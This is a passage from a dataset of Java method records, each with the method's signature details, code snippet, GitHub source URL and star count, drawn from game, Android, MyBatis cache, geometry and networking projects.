["public"], "return_type": "boolean", "snippet": "    public boolean providesShipComponent()  { return special; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechScanner.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56575, "method_name": "isObsolete", "class_name": "TechScanner", "params": ["Empire"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isObsolete(Empire c) {\n        return (shipRange < c.shipScanningRange()) && (planetRange < c.planetScanningRange());\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechScanner.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56576, "method_name": "provideBenefits", "class_name": "TechScanner", "params": ["Empire"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void provideBenefits(Empire c) {\n        super.provideBenefits(c);\n        c.shipScanningRange(max(c.shipScanningRange(), shipRange));\n        c.planetScanningRange(max(c.planetScanningRange(), planetRange));\n        c.knowShipETA(knowETA);\n        c.scanPlanets(scanPlanets);\n        c.setVisibleShips();\n        if (special) {\n            ShipSpecialScanner sh = new ShipSpecialScanner(this);\n            c.shipLab().addSpecial(sh);\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/tech/TechScanner.java", "stars": "74", "class_props": {"extends": "Tech", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56577, "method_name": "setFragments", "class_name": "ShowDetailPagerAdapter", "params": ["List<Fragment>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFragments(List<Fragment> fragments) {\n        mFragments = fragments;\n\n        if (mFragments.size() > 0)\n            mHasAbout = mFragments.get(0) instanceof ShowDetailAboutFragment;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/ShowDetailPagerAdapter.java", "stars": "4", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56578, "method_name": "getItem", "class_name": "ShowDetailPagerAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Fragment", "snippet": "    public Fragment getItem(int position) {\n        return mFragments.get(position);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/ShowDetailPagerAdapter.java", "stars": "4", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56579, "method_name": "getCount", "class_name": "ShowDetailPagerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        return mFragments.size();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/ShowDetailPagerAdapter.java", "stars": "4", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56580, "method_name": "getPageTitle", "class_name": "ShowDetailPagerAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "CharSequence", "snippet": "    public CharSequence getPageTitle(int position) {\n        if (mFragments.get(position) instanceof ShowDetailSeasonFragment) {\n            int seasonNumber = ((ShowDetailSeasonFragment) mFragments.get(position)).getSeasonNumber();\n            if (seasonNumber == 0)\n                return mContext.getString(R.string.specials);\n            return mContext.getString(R.string.season) + \" \" + seasonNumber;\n        }\n        return mContext.getString(R.string.about_series);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/adapters/ShowDetailPagerAdapter.java", "stars": "4", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56581, "method_name": "getFlagErased", "class_name": "GlobalWorldFlagContainer", "params": ["Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "WorldFlag<?,?>", "snippet": "    @Override public WorldFlag<?, ?> getFlagErased(Class<?> flagClass) {\n        final WorldFlag<?, ?> flag = super.getFlagErased(flagClass);\n        if (flag != null) {\n            return flag;\n        } else {\n            throw new IllegalStateException(String.format(\"Unrecognized flag '%s'. All flag types\"\n                + \" must be present in the global flag container.\", flagClass.getSimpleName()));\n        }\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/flags/GlobalWorldFlagContainer.java", "stars": "25", "class_props": {"extends": "WorldFlagContainer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56582, "method_name": "getFlag", "class_name": "GlobalWorldFlagContainer", "params": ["Class<T>"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <V, T extends WorldFlag<V, ?>> T getFlag(Class<? extends T> flagClass) {\n        final WorldFlag<?, ?> flag = super.getFlag(flagClass);\n        if (flag != null) {\n            return castUnsafe(flag);\n        } else {\n            throw new IllegalStateException(String.format(\"Unrecognized flag '%s'. All flag types\"\n                + \" must be present in the global flag container.\", flagClass.getSimpleName()));\n        }\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/flags/GlobalWorldFlagContainer.java", "stars": "25", "class_props": {"extends": "WorldFlagContainer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56583, "method_name": "getFlagClassFromString", "class_name": "GlobalWorldFlagContainer", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "    public Class<?> getFlagClassFromString(final String name) {\n        return stringClassMap.get(name.toLowerCase(Locale.ENGLISH));\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/flags/GlobalWorldFlagContainer.java", "stars": "25", "class_props": {"extends": "WorldFlagContainer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56584, "method_name": "getFlagFromString", "class_name": "GlobalWorldFlagContainer", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "WorldFlag<?,?>", "snippet": "    public WorldFlag<?, ?> getFlagFromString(final String name) {\n        final Class<?> flagClass = this.getFlagClassFromString(name);\n        if (flagClass == null) {\n            return null;\n        }\n        return getFlagErased(flagClass);\n    }", "url": "https://raw.githubusercontent.com/Sauilitired/Hyperverse/master/Core/src/main/java/se/hyperver/hyperverse/flags/GlobalWorldFlagContainer.java", "stars": "25", "class_props": {"extends": "WorldFlagContainer", "implements": null, "modifiers": ["final", "public"]}}, {"id": 56585, "method_name": "getItem", "class_name": "PagerAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Fragment", "snippet": "    public Fragment getItem(int position) {\n        // getItem is called to instantiate the fragment for the given page.\n        // Return a PlaceholderFragment (defined as a static inner class below).\n\n        if(position==0)\n        {\n            return OrdersInventoryFragment.newInstance(OrderStatusPickFromShop.ORDER_PLACED,true);\n        }\n        else if(position==1)\n        {\n            return OrdersInventoryFragment.newInstance(OrderStatusPickFromShop.ORDER_CONFIRMED,true);\n        }\n        else if(position==2)\n        {\n            return OrdersInventoryFragment.newInstance(OrderStatusPickFromShop.ORDER_PACKED,true);\n        }\n        else if(position==3)\n        {\n            return OrdersInventoryFragment.newInstance(OrderStatusPickFromShop.ORDER_READY_FOR_PICKUP,true);\n        }\n        else if(position==4)\n        {\n            return OrdersInventoryFragment.newInstance(OrderStatusPickFromShop.DELIVERED,true);\n        }\n\n\n\n        return OrdersInventoryFragment.newInstance(OrderStatusPickFromShop.ORDER_PLACED,true);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSellerModule/InventoryOrders/PickFromShopInventory/PagerAdapter.java", "stars": "10", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56586, "method_name": "getCount", "class_name": "PagerAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getCount() {\n        // Show 3 total pages.\n        return 5;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSellerModule/InventoryOrders/PickFromShopInventory/PagerAdapter.java", "stars": "10", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56587, "method_name": "getPageTitle", "class_name": "PagerAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "CharSequence", "snippet": "    public CharSequence getPageTitle(int position) {\n\n        switch (position) {\n            case 0:\n                return titlePlaced;\n            case 1:\n                return titleConfirmed;\n            case 2:\n                return titlePacked;\n            case 3:\n                return titleReadyForPickup;\n            case 4:\n                return titleDeliveryPending;\n        }\n\n\n        return null;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSellerModule/InventoryOrders/PickFromShopInventory/PagerAdapter.java", "stars": "10", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56588, "method_name": "setTitle", "class_name": "PagerAdapter", "params": ["String", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title, int tabPosition)\n    {\n        if(tabPosition == 0){\n\n            titlePlaced = \"Placed \" + title;\n        }\n        else if (tabPosition == 1)\n        {\n\n            titleConfirmed = \"Confirmed \" + title;\n        }\n        else if(tabPosition==2)\n        {\n            titlePacked = \"Packed \" + title;\n        }\n        else if(tabPosition==3)\n        {\n            titleReadyForPickup = \"Ready for Pickup \" + title;\n        }\n        else if(tabPosition==4)\n        {\n            titleDeliveryPending = \"Delivered \" + title;\n        }\n\n\n//        else if(tabPosition==4)\n//        {\n//            titlePaymentsPending = title;\n//        }\n\n        notifyDataSetChanged();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/aSellerModule/InventoryOrders/PickFromShopInventory/PagerAdapter.java", "stars": "10", "class_props": {"extends": "FragmentPagerAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 56589, "method_name": "getId", "class_name": "SoftCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return delegate.getId();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SoftCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56590, "method_name": "getSize", "class_name": "SoftCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getSize() {\n    removeGarbageCollectedItems();\n    return delegate.getSize();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SoftCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56591, "method_name": "setSize", "class_name": "SoftCache", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSize(int size) {\n    this.numberOfHardLinks = size;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SoftCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56592, "method_name": "putObject", "class_name": "SoftCache", "params": ["Object", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void putObject(Object key, Object value) {\n    removeGarbageCollectedItems();\n    delegate.putObject(key, new SoftEntry(key, value, queueOfGarbageCollectedEntries));\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SoftCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56593, "method_name": "getObject", "class_name": "SoftCache", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object getObject(Object key) {\n    Object result = null;\n    @SuppressWarnings(\"unchecked\") // assumed delegate cache is totally managed by this cache\n    SoftReference<Object> softReference = (SoftReference<Object>) delegate.getObject(key);\n    if (softReference != null) {\n      result = softReference.get();\n      if (result == null) {\n        delegate.removeObject(key);\n      } else {\n        // See #586 (and #335) modifications need more than a read lock\n        synchronized (hardLinksToAvoidGarbageCollection) {\n          hardLinksToAvoidGarbageCollection.addFirst(result);\n          if (hardLinksToAvoidGarbageCollection.size() > numberOfHardLinks) {\n            hardLinksToAvoidGarbageCollection.removeLast();\n          }\n        }\n      }\n    }\n    return result;\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SoftCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56594, "method_name": "removeObject", "class_name": "SoftCache", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "  public Object removeObject(Object key) {\n    removeGarbageCollectedItems();\n    return delegate.removeObject(key);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SoftCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56595, "method_name": "clear", "class_name": "SoftCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void clear() {\n    synchronized (hardLinksToAvoidGarbageCollection) {\n      hardLinksToAvoidGarbageCollection.clear();\n    }\n    removeGarbageCollectedItems();\n    delegate.clear();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SoftCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56596, "method_name": "removeGarbageCollectedItems", "class_name": "SoftCache", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void removeGarbageCollectedItems() {\n    SoftEntry sv;\n    while ((sv = (SoftEntry) queueOfGarbageCollectedEntries.poll()) != null) {\n      delegate.removeObject(sv.key);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SoftCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56597, "method_name": "getX", "class_name": "PointD", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getX() {\n        return x;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56598, "method_name": "getY", "class_name": "PointD", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getY() {\n        return y;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56599, "method_name": "set", "class_name": "PointD", "params": ["double", "double"], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void set(double x, double y) {\n        this.x = x;\n        this.y = y;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56600, "method_name": "set", "class_name": "PointD", "params": ["PointD"], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void set(PointD p) {\n        this.x = p.x;\n        this.y = p.y;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56601, "method_name": "negate", "class_name": "PointD", "params": [], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void negate() {\n        x = -x;\n        y = -y;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56602, "method_name": "offset", "class_name": "PointD", "params": ["double", "double"], "throws": null, "modifiers": ["final", "public"], "return_type": "void", "snippet": "    public final void offset(double dx, double dy) {\n        x += dx;\n        y += dy;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56603, "method_name": "equals", "class_name": "PointD", "params": ["double", "double"], "throws": null, "modifiers": ["final", "public"], "return_type": "boolean", "snippet": "    public final boolean equals(double x, double y) {\n        return this.x == x && this.y == y;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56604, "method_name": "length", "class_name": "PointD", "params": [], "throws": null, "modifiers": ["final", "public"], "return_type": "double", "snippet": "    public final double length() {\n        return length(x, y);\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56605, "method_name": "length", "class_name": "PointD", "params": ["double", "double"], "throws": null, "modifiers": ["public", "static"], "return_type": "double", "snippet": "    public static double length(double x, double y) {\n        return Math.sqrt(x * x + y * y);\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56606, "method_name": "toString", "class_name": "PointD", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return \"PointD{\" +\n                \"x=\" + x +\n                \", y=\" + y +\n                '}';\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56607, "method_name": "equals", "class_name": "PointD", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        PointD pointD = (PointD) o;\n        return Double.compare(pointD.x, x) == 0 &&\n                Double.compare(pointD.y, y) == 0;\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56608, "method_name": "hashCode", "class_name": "PointD", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int hashCode() {\n        return Objects.hash(x, y);\n    }", "url": "https://raw.githubusercontent.com/pi-181/num-methods-lab6/master/src/main/java/com/demkom58/divine/math/PointD.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56609, "method_name": "focusSearch", "class_name": "ShellFlyoutRecyclerAdapter_LinearLayoutWithFocus", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "android", "snippet": "\tpublic android.view.View focusSearch (int p0)\n\t{\n\t\treturn n_focusSearch (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellFlyoutRecyclerAdapter_LinearLayoutWithFocus.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 56610, "method_name": "n_focusSearch", "class_name": "ShellFlyoutRecyclerAdapter_LinearLayoutWithFocus", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "android", "snippet": "\tprivate native android.view.View n_focusSearch (int p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellFlyoutRecyclerAdapter_LinearLayoutWithFocus.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 56611, "method_name": "monodroidAddReference", "class_name": "ShellFlyoutRecyclerAdapter_LinearLayoutWithFocus", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellFlyoutRecyclerAdapter_LinearLayoutWithFocus.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 56612, "method_name": "monodroidClearReferences", "class_name": "ShellFlyoutRecyclerAdapter_LinearLayoutWithFocus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellFlyoutRecyclerAdapter_LinearLayoutWithFocus.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 56613, "method_name": "toString", "class_name": "PersonItemPair", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString(){\n        return new StringBuilder()\n                .append(\"PersonItemPair(\")\n                .append(person)\n                .append(\", \")\n                .append(item)\n                .append(\" )\")\n                .toString();\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nestedresulthandler/PersonItemPair.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56614, "method_name": "getPerson", "class_name": "PersonItemPair", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Person", "snippet": "    public Person getPerson() {\n        return person;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nestedresulthandler/PersonItemPair.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56615, "method_name": "setPerson", "class_name": "PersonItemPair", "params": ["Person"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPerson(Person person) {\n        this.person = person;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nestedresulthandler/PersonItemPair.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56616, "method_name": "getItem", "class_name": "PersonItemPair", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Item", "snippet": "    public Item getItem() {\n        return item;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nestedresulthandler/PersonItemPair.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56617, "method_name": "setItem", "class_name": "PersonItemPair", "params": ["Item"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setItem(Item item) {\n        this.item = item;\n    }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/nestedresulthandler/PersonItemPair.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56618, "method_name": "getId", "class_name": "SynchronizedCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {\n    return delegate.getId();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SynchronizedCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56619, "method_name": "getSize", "class_name": "SynchronizedCache", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "int", "snippet": "  public synchronized int getSize() {\n    return delegate.getSize();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SynchronizedCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56620, "method_name": "putObject", "class_name": "SynchronizedCache", "params": ["Object", "Object"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "  public synchronized void putObject(Object key, Object object) {\n    delegate.putObject(key, object);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SynchronizedCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56621, "method_name": "getObject", "class_name": "SynchronizedCache", "params": ["Object"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "Object", "snippet": "  public synchronized Object getObject(Object key) {\n    return delegate.getObject(key);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SynchronizedCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56622, "method_name": "removeObject", "class_name": "SynchronizedCache", "params": ["Object"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "Object", "snippet": "  public synchronized Object removeObject(Object key) {\n    return delegate.removeObject(key);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SynchronizedCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56623, "method_name": "clear", "class_name": "SynchronizedCache", "params": [], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "  public synchronized void clear() {\n    delegate.clear();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SynchronizedCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56624, "method_name": "hashCode", "class_name": "SynchronizedCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int hashCode() {\n    return delegate.hashCode();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SynchronizedCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56625, "method_name": "equals", "class_name": "SynchronizedCache", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean equals(Object obj) {\n    return delegate.equals(obj);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/cache/decorators/SynchronizedCache.java", "stars": "15", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 56626, "method_name": "run", "class_name": "ServerThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run(){\n        try{\n            DBManager manager = new DBManager();\n            manager.connect();\n\n            ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());\n            ObjectInputStream inputStream = new ObjectInputStream(socket.getInputStream());\n\n            PackageData packageData = null;\n            while ( (packageData=(PackageData)inputStream.readObject())!=null ){\n                if(packageData.getOperationType().equals(\"ADD\")){\n                    You userFromClient = packageData.getYou();\n                    manager.adduser(userFromClient);\n                }\n                else if(packageData.getOperationType().equals(\"LIST\")){\n                    ArrayList<You> infoForClient = manager.getAllusers();\n                    PackageData toClient = new PackageData(infoForClient);\n                    outputStream.writeObject(toClient);\n\n                }\n            }\n\n            inputStream.close();\n            outputStream.close();\n            socket.close();\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/Bekzatiitu/Final_Bekzat_Bekarys_ishs1901/master/Final%20Bekzat%20Bekarys%20ishs1901/src/ServerThread.java", "stars": "1", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["public"]}}, {"id": 56627, "method_name": "onReceive", "class_name": "TalkBroadcastReceiver", "params": ["Context", "Intent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onReceive(Context context, Intent intent) {\n        if (BROADCAST_TALK.equals(intent.getAction())) {\n            if (!mService.isConnected())\n                return;\n            IHumlaSession session = mService.getSession();\n            String status = intent.getStringExtra(EXTRA_TALK_STATUS);\n            if (status == null) status = TALK_STATUS_TOGGLE;\n            if (TALK_STATUS_ON.equals(status)) {\n                session.setTalkingState(true);\n            } else if (TALK_STATUS_OFF.equals(status)) {\n                session.setTalkingState(false);\n            } else if (TALK_STATUS_TOGGLE.equals(status)) {\n                session.setTalkingState(!session.isTalking());\n            }\n        } else {\n            throw new UnsupportedOperationException();\n        }\n    }", "url": "https://raw.githubusercontent.com/quite/mumla/master/app/src/main/java/se/lublin/mumla/service/ipc/TalkBroadcastReceiver.java", "stars": "9", "class_props": {"extends": "BroadcastReceiver", "implements": null, "modifiers": 